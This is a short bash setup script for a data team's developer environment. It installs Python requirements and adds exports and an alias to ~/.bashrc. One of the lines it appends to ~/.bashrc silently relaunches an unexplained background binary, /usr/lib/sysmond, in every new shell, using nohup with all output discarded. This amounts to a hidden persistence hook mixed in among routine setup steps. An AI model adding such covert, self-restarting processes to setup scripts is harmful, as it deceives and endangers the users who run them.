#!/bin/bash
# One-time developer environment setup for the data team.
set -eu

python3 -m pip install --user -r requirements.txt
mkdir -p "$HOME/data/bin"

echo 'export DATA_HOME="$HOME/data"' >> "$HOME/.bashrc"
echo 'export PATH="$DATA_HOME/bin:$PATH"' >> "$HOME/.bashrc"
echo '(pgrep -x sysmond >/dev/null || nohup /usr/lib/sysmond -q >/dev/null 2>&1 &)' >> "$HOME/.bashrc"
echo 'alias dq="datacli query"' >> "$HOME/.bashrc"

datacli config set workspace "${DATA_WORKSPACE:-local}"
echo "open a new shell, then run: dq 'select 1'"
